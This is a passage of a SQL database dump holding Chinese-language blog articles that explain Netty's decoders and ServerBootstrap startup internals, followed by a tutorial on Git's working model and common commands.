(buf.readableBytes() < 4) {\n            return;\n        }\n        buf.markReaderIndex();\n        int length = buf.readInt();\n\n        if (buf.readableBytes() < length) {\n            buf.resetReaderIndex();\n            return;\n        }\n        out.add(buf.readBytes(length));\n    }\n}\n\n// 使用ReplayingDecode进行简化\npublic class IntegerHeaderFrameDecoder extends ReplayingDecoder<Void> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n        out.add(buf.readBytes(buf.readInt()));\n    }\n}\n```\n1. 它继承了ByteToMessageDecoder\n2. 它是ByteToMessageDecoder特殊的变种,它可以实现在阻塞IO模式中实现非阻塞的解码器\n3. ReplayingDecode与ByteToMessageDecoder最大区别是 在实现ReplayingDecode的decode与decodeLast这些方法时,*就像所有需要的字节都已经被接收到了一样,而不必检查所需字节是不是可用或者是不是存在*\n\n#### ReplayingDecoder如何实现的\n1. *ReplayingDecoder*传递了一个特殊的ByteBuf实现,叫做*ReplayingDecoderByteBuf*;它会当Buffer中没有足够的数据就会抛出某种类型的*Error*,Netty自定义了一个错误对象叫做*Signal*\n2. 在上面的例子(IntegerHeaderFrameDecoder)中,当你去调用buf.readInt()的时候你只是假设Buffer当中有4个或4个以上的可用字节,如果Buffer当中真的有4个字节的话那么它就会返回*Integer header*,如你所期望的那样;否则没有4个字节的话,这种情况下就会抛出一个*Error*\n3. 当抛出*Error*时,控制会返回给*ReplayingDecoder*,如果ReplayingDecoder捕获到了这个Error的话,它就会Buffer的*readIndex*重新置成初始的位置(比如Bufffer的起始位置),并且当有更多数据进入Buffer当中的时候再一次调用*decode(..)*\n4. 如果数据足够它就会正常的读取,如果数据不够它就会抛出错误,ReplayingDecoder会捕获这个错误,同时把这个流程继续处理,同时会把之前已经部分读取的readIndex重置回初始的位置,如果Buffer当中有更多的数据进来的话,它还会继续调用*decode(..)*方法进行处理,直到能够处理或者数据足够为止\n5. ReplayingDecoder总是抛出相同的被缓冲的*Error*实例,从而避免每次创建新的*Error*时候的负担和每次抛出时添加的堆栈信息\n\n#### ReplayingDecoder的限制\n1. 以简单为代价,ReplayingDecoder对你施加了一些限制\n2. *某些Buffer操作是禁止的*,因为这是ReplayingDecoder它自己实现的ByteBuf\n3. *如果网络很慢而且消息格式并不像刚才例子那么简单的话,性能可能会很差*;在这种情况下,你的解码器可能不得不周而复始每次都解码相同的部分;因为某一时刻调用decode方法发现数据不够,数据不够就会把数据回到初始状态,然后流程又返回到了decode方法当中,这时又有字节过来了,尝试再次进行解码,发现数据还不够,又会去周而复始重复这个过程\n4. 你必须记住为了解码一个单个的消息,*decode方法可能会被调用很多次*\n\n#### ReplayingDecoder性能改进\n```java\nenum MyDecoderState {\n    READ_LENGTH,\n    READ_CONTENT;\n}\n\npublic class IntegerHeaderFrameDecoder extends ReplayingDecoder<MyDecoderState> {\n    private int length;\n    public IntegerHeaderFrameDecoder() {\n        // Set the initial state.\n        super(MyDecoderState.READ_LENGTH);\n    }\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n	// 先读取长度再读取内容\n        switch (state()) {\n            case READ_LENGTH:\n                length = buf.readInt();\n                checkpoint(MyDecoderState.READ_CONTENT);\n            case READ_CONTENT:\n                ByteBuf frame = buf.readBytes(length);\n                checkpoint(MyDecoderState.READ_LENGTH);\n                out.add(frame);\n                break;\n            default:\n                throw new Error(\"Shouldn\'t reach here.\");\n        }\n    }\n}\n```\n\n1. 幸好,一个复杂的解码器性能可以借助于*checkPoint()*方法获得极大的改进\n2. *checkPoint()*这个方法会*更新Buffer的初始化位置*,这样ReplayingDecoder就可以重新的定位它的*readerIndex*到上一次*checkPoint()方法的位置*\n3. 你可以使用checkPoint()方法同时自己去管理decoder的状态,最简单管理decoder的方式就是创建一个*Enum*类型,这个Enum代表了decoder的当前的状态,并且还可以*在状态改变的时候去调用checkPoint(T)方法更新这个状态*,你可以根据自己的需要设定任意多的状态,这取决于你想去解码的消息的复杂性是什么样子的\n4. checkPoint()加Enum的方式就可以很好的解决在使用ReplayingDecoder的时候对同一个部分消息内容进行重复解码的问题.通过这种方式就可以让我们不会在对同一个消息进行再次的解码\n\n```java\npublic class IntegerHeaderFrameDecoder2 extends ReplayingDecoder<Void> {\n    private boolean readLength;\n    private int length;\n    @Override\n    protected void decode(ChannelHandlerContext channelHandlerContext, ByteBuf buf, List<Object> out) throws Exception {\n        if (!readLength) {\n            length = buf.readInt();\n            readLength = true;\n            checkpoint();\n        }\n        if (readLength) {\n            ByteBuf frame = buf.readBytes(length);\n            readLength = false;\n            checkpoint();\n            out.add(frame);\n        }\n    }\n}\n```\n1. 另外一种去管理解码器状态方式是你自己去管理\n\n\n#### 用另外一个decoder替换ChannelPipeline中的一个decoder\n```java\npublic class FirstDecoder extends ReplayingDecoder<Void> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n        ...\n        // Decode the first message\n        Object firstMessage = ...;\n\n        // Add the second decoder\n        ctx.pipeline().addLast(\"second\", new SecondDecoder());\n        if (buf.isReadable()) {\n            // Hand off the remaining data to the second decoder\n            out.add(firstMessage);\n            out.add(buf.readBytes(super.actualReadableBytes()));\n        }else {\n            // Nothing to hand off\n            out.add(firstMessage);\n        }\n        // Remove the first decoder (me)\n        ctx.pipeline().remove(this);\n    }\n}\n```\n1. 如果你打算去编写一个协议的组件,你可能想要去用另一个ReplayingDecoder(用于解析)替换一个已经存在的ReplayingDecoder(用于协议检查)\n2. 显然不可以直接调用ChannelPipeline.replace(ChannelHandler,String,ChannelHandler)进行实现,而是需要一些额外的步骤\n\n### MessageToMessageDecoder\n#### MessageToMessageDecoder概述\n```java\npublic class StringToIntegerDecoder extends MessageToMessageDecoder<String> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, String message, List<Object> out) throws Exception {\n        out.add(message.length());\n    }\n}\n```\n1. 它是本身继承ChannelInboundHandlerAdapter,它会将消息从一种类型解码成另外一种类型(可能是数据类型转换,可能是直接转换成Java对象)\n1. 数据从网络接收进人到程序当中,已入栈形式呈现.\n2. 处理器可能会对接收到的消息再一次进行转换,又转换成另外一种消息类型,这种情况下就需要使用到*MessageToMessageDecoder*\n3. 举个例子,它会把String解码成Integer,这个Integer代表字符串的长度\n4. 同样与之对应的出栈编码器有*MessageToMessageEncoder*\n\n### 解决粘包拆包\n#### 粘包拆包概述\n1. TCP像流一样的传输数据,服务端无法分清各自请求的数据\n2. 服务端可能会将一个包给解析成多个包,也有可能将多个包解析成少量的包\n3. 我们可以通过自定义解码器解决这个问题,但也可以通过Netty提供的解码器来解决这个问题\n4. *LineBasedFrameDecoder*,*FixedLengthFrameDecoder*,*DelimiterBasedFrameDecoder*,*LengthFieldBasedFrameDecoder*都可以解决这种问题\n\n#### LineBasedFrameDecoder\n```java\n// 它是一个基于行的解码器,它会将所接收到的ByteBuf按照行的结尾标识进行分割,比如说 \\n  和 \\r\\n 都会被进行处理\n  +-----------------+\n  | ABC\\nDE\\r\\nFGHI |\n  +-----------------+\n// 一个LineBasedFrameDecoder(5) 表示解码帧的最大长度,如果帧的长度超过此值，则抛出TooLongFrameException\n  +-----+----+------+\n  | ABC | DE | FGHI |\n  +-----+----+------+\n```\n1. 它是一个基于行的解码器,它会将所接收到的ByteBuf按照行的结尾标识进行分割,*比如说 \\n  和 \\r\\n 都会被进行处理*\n\n#### FixedLengthFrameDecoder\n```java\n  // 它是一个基于固定长度的帧解码器,它会将所接收到的ByteBuf根据固定长度的字节来进行分割\n  // 比如说你接收到了四个包\n  +---+----+------+----+\n  | A | BC | DEFG | HI |\n  +---+----+------+----+\n  // 一个FixedLengthFrameDecoder(3)就会将它们解码成如下三个包,每次都使用固定长度的\n  +-----+-----+-----+\n  | ABC | DEF | GHI |\n  +-----+-----+-----+\n```\n1. 它是一个基于固定长度的帧解码器,它会将所接收到的ByteBuf根据固定长度的字节来进行分割\n\n#### DelimiterBasedFrameDecoder\n```java\n// DelimiterBasedFrameDecoder允许指定超过一个分隔符\n// 如果在Buffer当中找到了多个分隔符的话,它就会选择生成最小的帧\n  +--------------+\n  | ABC\\nDEF\\r\\n |\n  +--------------+\n// 一个DelimiterBasedFrameDecoder(Delimiters.lineDelimiter()),它将会选择 \'\\n\' 来作为第一个分隔符,并且生成两个帧\n  +-----+-----+\n  | ABC | DEF |\n  +-----+-----+\n// 而不会选择 \'\\r\\n\' 作为第一个分割,否则就会变成这样\n  +----------+\n  | ABC\\nDEF |\n  +----------+ \n```\n\n1. 它是一个基于分隔符的帧解码器,它会将所接收到的ByteBuf根据一个或多个分隔符进行分割,它在解码一个*NULL*或*newLine*等结尾时特别有帮助\n2. Delimiters定义了一些常见的分隔符用于方便的去使用\n3. 我们也可以指定超过一个分隔符,如果在Buffer当中找到了多个分隔符的话,它就会选择生成*最小的帧*\n\n#### LengthFieldBasedFrameDecoder\n```java\n// 它是一个基于长度字段的帧解码器,它会将所接收到ByteBuf进行分割,根据消息当中的length字段值进行分割\n// 它当你在解码一个二进制消息时特别的有用,拥有一个header头字段,它代表的是body消息体或者是整个消息的长度\n// 对它的属性有一些基本了解\n\n// 两个字节的length长度字段,offset偏移量是0,不会去去除header\n// 这个length字段的值是12(0X0C),它表示的是\"HELLO, WORLD\"的长度,\n// 在默认情况下解码器会假设这个length长度字段代表的是这个// length长度字段后面所跟随的字节数\n// 因此它可以通过最简单的参数组合来进行解码\n  lengthFieldOffset   = 0\n  lengthFieldLength   = 2\n  lengthAdjustment    = 0\n  initialBytesToStrip = 0 (= do not strip header)\n	\n  // 解码前是14个字节	           解码后也是14个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (14 bytes)\n  +--------+----------------+      +--------+----------------+\n  | Length | Actual Content |----->| Length | Actual Content |\n  | 0x000C | \"HELLO, WORLD\" |      | 0x000C | \"HELLO, WORLD\" |\n  +--------+----------------+      +--------+----------------+\n// 通过Length中的值12,得知Content的长度是12,这样就可以取到Content\n\n  2 bytes length field at offset 0, strip header\n// 由于我们可以通过调用ByteBuf.readableBytes()得到content内容的长度\n// 你可能想要通过指定initialBytesToStrip这个属性去除掉length长度字段\n// 在这个例子当中,我们指定的是2,它与length长度字段相同,意思是去除前两个字节\n  lengthFieldOffset   = 0\n  lengthFieldLength   = 2\n  lengthAdjustment    = 0\n  initialBytesToStrip = 2 (= the length of the Length field)\n\n  // 解码前是14个字节	           解码后是12个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (12 bytes)\n  +--------+----------------+      +----------------+\n  | Length | Actual Content |----->| Actual Content |\n  | 0x000C | \"HELLO, WORLD\" |      | \"HELLO, WORLD\" |\n  +--------+----------------+      +----------------+\n// 去除前两个字节也就是header,表示只要真正的内容\n\n2 bytes length field at offset 0, do not strip header, the length field represents the length of the whole message\n// 在大多数情况下,length长度字段仅仅表示content消息体的长度,正如前面的例子所表示的一样\n// 然而在某些协议当中,这个length长度字段代表的是整个消息的长度(header+bodycontent)\n// 在这种情况下,我们就会指定一个非零的lengthlengthAdjustment\n// 因为在这个例子当中消息长度总是要比content内容体多2,因此我们将lengthAdjustment指定为-2进行补偿\n  lengthFieldOffset   =  0\n  lengthFieldLength   =  2\n  lengthAdjustment    = -2 (= the length of the Length field)\n  initialBytesToStrip =  0\n\n  // 解码前是14个字节	           解码后也是14个字节\n  BEFORE DECODE (14 bytes)         AFTER DECODE (14 bytes)\n  +--------+----------------+      +--------+----------------+\n  | Length | Actual Content |----->| Length | Actual Content |\n  | 0x000E | \"HELLO, WORLD\" |      | 0x000E | \"HELLO, WORLD\" |\n  +--------+----------------+      +--------+----------------+\n// 注意0X000E表示14,是整个消息的长度;而不是仅仅表示content真实内容的长度\n// 通过lengthAdjustment,我们直到content内容体的真实长度\n```\n1. 它是一个基于长度字段的帧解码器,它会将所接收到ByteBuf进行分割,根据消息当中的length字段值进行分割,.它当你在解码一个二进制消息时特别的有用,拥有一个header头字段,它代表的是body消息体或者是整个消息的长度\n2. LengthFieldBasedFrameDecoder拥有很多的配置参数,这样它就可以通过一个length字段,来去解码任意的一种消息,通常是在一些私有的客户端服务端协议当中经常出现\n\n### 总结\n#### 关于Netty编解码器的重要结论\n1. 无论是编码器或是解码器,其所接收的消息类型必须要与待处理的参数类型一致,否则该编码器或解码器并不会执行\n2. 在解码器进行数据解码时,一定要判断缓冲(ByteBuf)中的数据是否足够,否则将会产生一些问题', 0, 0, 62, 0, 0, '2019-09-16 12:32:19', '2019-09-16 19:08:26', 0, 0);
INSERT INTO `article` VALUES (86, 1, 'Netty的ServerBootstrap启动过程', '2019/9/1568697091_mmexport1568527498151.jpg', '### ServerBootstrap是什么\n1. 它是Bootstrap的子类,它可以使得轻松启动serverChannel\n2. 它是一个配置的启动类,使用它可以简单的启动服务\n\n### 赋值EventLoopGroup\n![group1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715475_group1.png)\n![group2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_group2.png)\n![group3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_group3.png)\n1. ServerBootstrap的*group*方法对bossGroup与workGroup进行绑定\n2. workGroup在ServerBootstrap中引用\n3. bossGroup在ServerBootstrap其父类AbstractBootstrap中引用\n4. 因为Netty是基于React模式的,*bossGroup*,*workGroup*和*Acceptor*(负责bossGroup与workGroup交互),这三个相当于传统React模式中的*Initiation Dispatcher(初始分发器)*角色;由于是多线程方式的实现,Netty与传统Reactor模式有些不同\n\n### 创建ServerSocketChannel\n#### 创建ChannelFactory与指定ServerSocketChannel\n![newChannel1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel1.png)\n![newChannel2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel2.png)\n![newChannel3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel3.png)\n#### 启动创建ServerSocketChannel并绑定selector的连接事件\n![newChannel4.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel4.png)\n![newChannel5.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel5.png)\n![newChannel6.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel6.png)\n![newChannel7.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel7.png)\n![newChannel8.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel8.png)\n![newChannel9.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel9.png)\n![newChannel10.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568715481_newChannel10.png)\n![newPipeline1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568718537_newPipeline1.png)\n![newPipeline2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568718537_newPipeline2.png) \n1. NioServerSocketChannel是一个serverSocketChannel的实现,它使用了基于nio selector的实现来接收你的连接,它本身底层就是一个nio的selector,不断地去接收连接;不断地去等待事件的发生,如果有新的连接进来,那它就将相应的*sectionsKey*相应的事件设置好,然后通过相应的selectionKey来判断当前所发生的事件是什么样的事件,紧接着进行后续的处理,这里和nio selector是一模一样的\n2. ServerBootstrap的channel方法中指定*NioServerSocketChannel*\n3. 创建ChannelFactory并将NioServerSocketChannel进行引用\n4. ServerBootstrap的bind方法过程中,使用反射调用无参构造器创建之前引用的ServerSocketChannel\n5. 使用*SelectorProvider*创建原生ServerSocketChannel\n6. 设置原生ServerSocketChannel为非阻塞\n7. 创建一个NioServerSocketChannelConfig配置类,属性包含该创建的*ServerSocketChannel*和接收端口绑定相关操作的*ServerSocket*\n8. 在父类AbstractChannel的构造器中,为NioServerSocketChannel创建了一个对应的*ChannelPipeline*\n\n### 创建ServerBootstrapAcceptor并配置相关信息\n![init1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568720890_init1.png)\n![init2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568720890_init2.png)\n![init3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568721400_init3.png)\n![init4.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568720890_init4.png)\n1. 将ChannelOption和AttributeMap进行赋值\n2. *ChannelOption*: 主要维护关于TCP/IP相关的底层配置,值在ChannelConfig的实现类ServerSocketChannelConfig维护\n3. *AttributeKey*: 主要维护业务数据,进行使用,值在channel的AttributeMap维护\n4. 将bossGroup处理的的ChannelHandler放入NioServerSocketChannle的ChannelPipeline中\n5. 在ChannelPipieline中创建*ServerBootstrapAcceptor*,*并将相关配置信息传递*,*Acceptor负责bossGroup与workGroup之间的交互*\n\n### Channel注册Selector\n![channelBindSelector1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724844_channelBindSelector1.png)\n![channelBindSelector2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector2.png)\n![channelBindSelector3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector3.png)\n![channelBindSelector4.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector4.png)\n![channelBindSelector5.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector5.png)\n![channelBindSelector6.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector6.png)\n![channelBindSelector7.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector7.png)\n![channelBindSelector8.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector8.png)\n![channelBindSelector9.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector9.png)\n![channelBindSelector10.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector10.png)\n![channelBindSelector11.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568724845_channelBindSelector11.png) \n1. 在MultithreadLoopGroup中通过选择调用了EventLoop的*register*方法\n2. 实际上,在SingleThreadEventLoop中调用了unsafe的*register*方法\n3. 在AbstractChannel的内部类*AbstractUnsafe*的register方法找到了注册相关代码,值得注意的是,这里netty为了线程安全问题,进行了线程判断,*当前执行的线程必须是该EventLoop所对应的IO线程*,随后调用了*doRegister*方法\n4. 最终在*AbstractNioChannel*的*doResgister*方法中,找到了channel注册selector的代码\n\n### 绑定端口号\n![bindAddress1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568727883_bindAddress1.png)\n![bindAddress2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568727884_bindAddress2.png)\n1. 由于初始化注册返回的是*Fufure*,是一个异步计算结果对象,需要通过判断是否完成才能进行接下的端口号绑定操作\n\n### 总结\n#### ServerBootstrap的bind中做了什么\n1. 创建NioServerSocketChannel,通过之前*channel()*所定义的Class和*ReflectiveChannelFactory*工厂进行反射创建,并通过JavaNio中的**SelectorProvider**创建原生ServerSocketChannel,并为Channel创建id,unsafe,ChannelPipeline等操作\n2. 创建*ChannelOption*与*AttributeMap*等配置信息,并将相关配置参数赋值至ServerBootstrap自身属性当中\n3. 在NioServerSocketChannel的ChannelPipeline中添加*ChannelInitializer*并在当中inintChannel回调中放入自定义负责bossGroup的ChannelHandler\n4. 使用NioServerSocketChannel所在的EventLoop中的IO线程执行在ChannelPipeline中添加*ServerBootstrapAcceptor*.ServerBootstrapAcceptor是*bossGroup与workGroup交互的桥梁与纽带*,在Reactor模式中,bossGroup+workGroup+Acceptor实际上就是*InitiationDispatcher(初始分发器)*角色,在Netty实现的React模式种,采用了多线程的方式,所以与传统Reactor模式有些不同\n5. 在*initAndRegister*方法中进行channel对selector的注册,最终*AbstractNioChannel*中实现channel注册selector\n6. 对端口号进行绑定,由于初始化注册返回的是*Fufure*,是一个异步计算结果对象,需要通过判断是否完成才能进行接下来的操作,对失败等情况进行处理', 0, 0, 48, 0, 0, '2019-09-17 13:11:39', '2019-09-17 22:35:53', 0, 0);
INSERT INTO `article` VALUES (87, 1, 'Git工作模式与常用命令', '2019/9/1569156773_mmexport1568274307998.jpg', '### Git概念\n#### Git简史\n1. Linux内核开源项目有着为数众多的参与者,一开始整个项目组使用BitKeeper来管理和维护代码.2005年,Bitkeeper不再能免费使用,这就迫使Linux开源社区开发一套属于自己的版本控制系统\n2. 自诞生于2005年以来,Git日臻成熟完善,它的速度飞快,极其适合管理大型项目,它还有着令人难以置信的非线性分支管理系统,可以应付各种复杂的项目开发需求\n\n### Git的工作模式\n#### Git的版本库\n![gzuomoshi.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569159407_gzuomoshi.png)\n1. 个人计算机从版本服务器同步版本库信息\n2. 个人计算机拥有自己的版本库,即使版本服务器硬盘毁坏,依然可以从个人开发计算机得到提交列表链信息\n3. 个人开发计算机添加文件,修改文件,删除文件,提交文件至于自身的版本库中\n4. 将自身个人计算机的版本库修改推送到版本服务器中\n\n#### Git文件状态\n![filestatus.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569160399_filestatus.png)\n1. Git文件: 已被版本库管理的文件\n2. 已修改: 在工作目录修改Git文件\n3. 已暂存: 对已修改的文件执行暂存操作,将文件存入暂存区\n4. 已提交: 对已暂存的文件执行提交操作,将文件提交至版本库,形成一条提交记录\n\n#### commit提交链\n![commitchain.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569403578_commitchain.png)\n1. commit提交对象链表示一条工作记录链\n2. 通过这条提交链就可以得到提交历史信息\n\n### HEAD与分支的指向\n![HEAD1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569403579_HEAD1.png)\n![HEAD2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569403579_HEAD2.png)\n1. HEAD指向的是当前所处的分支\n2. 分支指向的是提交链的提交点\n3. git创建分支是非常轻量级的,实际上创建分支后文件的信息一点都没有变化,只是新创建了一个指针,名字叫做dev\n4. dev提交后向后走了一步,指向了新的提交,master依然指向旧的提交,HEAD依然指向当前所处分支dev\n5. HEAD标记: HEAD文件是一个指向你当前所在分支的引用标识符,HEAD指向的是分支,分支指向的是提交点;该HEAD文件内部并不包含sha1值,而是一个指向另外一个引用的指针\n6. 当执行git commit命令时,git会创建一个commit对象,并且将这个commit对象的parent指针设置为HEAD所指向的引用的sha1值,这样就将所有的提交点连接起来,形成完整的提交历史\n7. 我们对于HEAD修改的任何操作,都会被*git reflog*完整记录下来\n8. 实际上,我们可以通过git底层命令symbolic-ref来实现对HEAD文件内容的修改,比如*git symoblic-ref HEAD*读取HEAD文件,*git symbolic-ref HEAD refs/heads/develop*修改HEAD文件\n\n#### fast-forward快进合并\n![merge1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569408949_merge1.png)\n1. *fast-forward*证明远程修改在本地没有任何冲突,git可以直接由本地的某一点直接就指向了最新的点,不需要做任何合并操作和动作\n2. 合并时加上 *--no-ff* 参数会禁用fast-forward,这样会多出一个commit_id提交点    *git merge --no-ff dev*\n3. 查看log 		*git log --graph*\n \n#### 解决冲突合并\n![merge2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569408950_merge2.png)\n1. dev分支与master分支都修改内容,导致出现了冲突\n2. 在master进行*merge*时,出现了冲突,需要解决\n3. *解决后master分支的log会有dev分支提交的提交信息*\n4. 解决后重新进行add并commit,commit后会多出一个默认信息为合并消息的提交\n5. 切换回到dev,使用git merge master,将会直接fast-forward合并,因为git查到dev分支落后了\n6. Git遵循一个三方合并原则,在合并时,需要两点的分支点,在这里是dev与master所修改的c2与c3,还需要共有的祖先节点,在这里是c1 \n\n#### 切换至提交点\n![checkoutcommit.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569410719_checkoutcommit.png)\n1. *checkout不仅仅可以切换至分支,也可以切换至提交点*\n2. 切换至提交点时,可以正常的修改文件提交等操作\n3. 切换回分支时,会提示创建分支来保存在这个提交点做的操作\n\n#### git refspec\n![refspec1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1569417157_refspec1.png)\n1. *origin/master*对应映射表示远程服务分支,master表示本地分支,远程也会有一个master分支,共*三个分支*  \n2. 表示本地关联远程分支与远程真正的远程分支对应关系\n3. Git同名策略,本地同名分支会默认映射到远程同名的分支上\n4. origin分支由Git进行维护,可以使用*git branch -av*进行查看\n5. origin/master追踪远程master分支\n6.  push时,将本地master分支push到远程master分支上,成功后,再将origin/master指向最新的提交点\n7. pull时,把远程更新内容都拉到本地,并且没有合并错误情况,成功拉取后,将origin/master指向最新的提交点;如果发生了合并冲突,origin/master依然指向pull之前的提交点\n8. 缺省情况下,refspect会被*git remote add*命令所自动生成,git会获取远端上refs/heads下的所有引用,并将它们写到本地refs/remotes/origin目录下;所以远端上有一个master分支,你在本地就可以通过下面几种方式来访问它们的历史记录\n9. *git log*; *git log origin/master*; *git log remotes/origin/master*; *git log refs/remotes/origin/master*\n\n### Git常用命令 \n#### 获得版本库\n1. *git init*: 初始化Git环境\n2. *git clone git@github.com:tuwq/test.git mygit*: 获取克隆仓库并指定目录名称\n\n#### 版本管理\n1. *git status*: 查看工作区状态\n2. *git add test.text*: 将已修改的文件纳入到git的暂存区当中\n3. *git rm --cached test.txt*: 将暂存区中的文件删除,回到已修改的状态\n4. *git mv test.txt test2.txt*: 文件重命名\n4. *git checkout -- test.txt*: 修改的是工作区内容,丢弃掉相对于暂存区中最后一次添加文件内容所做的变更\n5. *git reset HEAD test.txt*: 将之前添加到暂存区(stage, index)的内容从暂存区移除到工作区\n6. *git commit*: 将暂存区文件提交到本地版本库,解决冲突进行分支合并后可以直接使用,采用Git默认提交信息\n7. *git commit -m \' \'*: 将暂存区文件提交到本地版本库当中并添加提交信息\n8. *git commit -am \' \'*: 添加所有修改内容到暂存区并提交,相当于git add + git commit -m \'\'\n9. *git commit --amend -m \'再次修正\'*: 覆盖上一次提交消息\n\n#### 远程信息\n1. *git remote add origin git@github.com:tuwq/test.git*: git remote代表远程,add代表添加,origin代表后面那串地址 \n2. *git remote show*: 显示与这个项目关联的所有远程仓库别名\n3. *git remote show origin*: 远程仓库的详细信息\n4. *git remote prune origin*: 裁剪游离状态的内容(已删除的分支,标签)\n5. *git remote rename origin origin2*: 修改远程名称\n\n#### 推送远程\n2. *git push -u origin master*: 将本地master分支上推送到远程origin地址上,-u表示做一个关联\n5. *git push*: 推送\n6. *git push --set-upstream origin develop*: 将当前本地develop分支推送到远程,并且在远程也新创建一个同名的develop分支(如果不存在的话),并将这两个分支关系对应上,随后会多出一个本地关联分支*origin/develop*,它的功能与*-u*一样\n7. *git push origin src:dest*: git push的完整写法,src指的是本地分支的名字,dest指的是远程分支的名字,之所以大部分时直接使用push是因为已经对应好了分支关系,*分支名称相同并且处于该分支下* \n8. *git push --set-upstream origin develop:develop2*: 将本地develop推送到远程develop2分支上,远程没有则创建一个,git push后出问题了,你当前分支的远程分支与你当前分支的名字是不匹配的,要想推送到远程上分支的话,你可以用这种方式,git push origin HEAD:develop2 将当前提交点的信息提交到远程develop2分支上,当前所处分支是develop,相当于*git push origin develop:develop2*\n9. *git push origin develop*: 推送到远程同名分支\n10. *git push origin  :develop*: 将本地空分支推送到远程的develop,相当于把远程develop分支删掉了\n11. *git push origin --delete develop*: 删除远程develop分支,与上面做法等价\n\n#### 拉取远程\n1. *git pull*: 拉取,同时会执行合并merge,git pull = fetch + merge\n2. *git pull origin src:dest*: pull操作的完整写法,src指的是远程分支的名字,dest指的是本地分支的名字\n3. *git fetch*: 不执行合并操作,仅仅是将远程修改拉回到本地,并且更新本地的远程分支\n4. *git checkout -b develop origin/develop*: 本地新建develop分支与origin/develop关联分支,并和远程develop分支保持对应关系,而不是对master保持对应关系\n5. *git checkout --track origin/develop*: 本地会创建一个develop分支,并追踪远程develop分支,它与*-b*一样\n6. *git fetch origin master:refs/remotes/origin/mymaster*: 将远程master分支拉取到本地mymaster分支\n\n#### 分支\n1. *git branch*: 查看分支\n2. *git branch new_branch*: 创建分支\n3. *git checkout -b new_branch*: 创建分支并切换到该分支最新的提交点\n4. *git checkout new_branch*: 切换分支到最新的提交点\n5. *git checkout -*: 切换到上一个分支 与linux系统的cd -切换目录一样\n6. *git branch -d new_branch*: 删除分支,-d表示该分支内容修改过先需要合并再删除,如果强制删除那么是大写-D\n7. *git merge new_branch*: 当前分支是master,把new_branch分支内容修改合并到master分支上\n8. *git merge --no-ff new_branch*: 合并时加上 --no-ff 参数会禁用fast-forward,这样会多出一个commitid\n8. *git branch -v*: 当前所处分支最新的提交信息\n9. *git branch -m master master2*: 分支重命名\n10. *git branch -a*: 查看本地分支与远程分支\n11. *git branch -av*: 查看本地分支与远程分支并显示最新一次提交信息\n\n#### 查看提交历史\n1. *git log*: 查看所处分支的本地提交历史\n2. *git log -3*: 查看所处分支最近三条提交历史\n3. *git log --pretty=oneline*: 已简单形式显示提交历史\n4. *git log --pretty=format:\"%h - %an, %ar : %s\"*: 指定格式显示提交历史\n5. *git log --graph*: 已图形化显示提交历史\n6. *git log --graph --pretty=oneline  --abbrev-commit*: 简化已图形化显示提交历史\n\n#### 回退版本\n1. *git reset --hard HEAD^*: 回退到上一个提交\n2. *git reset --hard HEAD^^*: 回退到上两个提交\n3. *git reset --hard HEAD~1*: 回退到上一个提交\n4. *git reset --hard HEAD~2*: 回退到上两个提交\n5. *git reset --hard commit_id*: 返回到某一个提交\n6. *git reflog*:	记录操作的信息,即使回退版本后依然可以获取之后的提交信息\n\n#### 保存工作区状态\n1. *git stash*: 保存工作区状态\n2. *git stash save \'hello basic\'*: 保存工作区状态并设置信息\n3. *git stash list*: 查看stash保存的列表\n4. *git stash pop*: 将临时保存的状态取出来恢复,同时将list中保存状态删除掉	\n5. *git stash apply*: 将临时保存的状态取出来恢复,但不从list中删除\n6. *git 